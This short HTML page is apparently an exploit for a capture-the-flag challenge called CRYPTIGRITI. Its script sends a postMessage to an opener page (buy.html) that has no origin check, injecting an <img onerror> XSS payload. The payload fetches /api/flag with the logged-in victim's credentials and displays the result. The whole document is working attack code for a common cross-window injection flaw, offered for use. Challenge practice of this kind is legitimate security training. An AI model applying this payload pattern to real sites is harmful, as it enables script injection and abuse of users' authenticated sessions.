<!DOCTYPE html>
<html>
<head>
    <title>CRYPTIGRITI Flag Exploit</title>
</head>
<body>
<h1>Send XSS to get flag</h1>
<script>
// Wait a moment then send the exploit
setTimeout(() => {
    // Target must be buy.html page
    window.opener.postMessage({
        type: 'updateContent',      // Must match exactly
        widgetId: 'salesWidget',    // Target div ID from buy.html
        content: '<img src=x onerror="document.getElementById(\'flagBanner\').classList.remove(\'hidden\'); fetch(\'/api/flag\',{credentials:\'include\'}).then(r=>r.json()).then(d=>{if(d.flag){document.getElementById(\'flagText\').textContent=\'FLAG: \'+d.flag;}})">'
    }, '*'); // No origin check - the vulnerability
    
    alert('XSS payload sent! Check buy.html for flag banner.');
}, 1000);
</script>
<p>Make sure you are logged into CRYPTIGRITI and have buy.html open.</p>
</body>
</html>
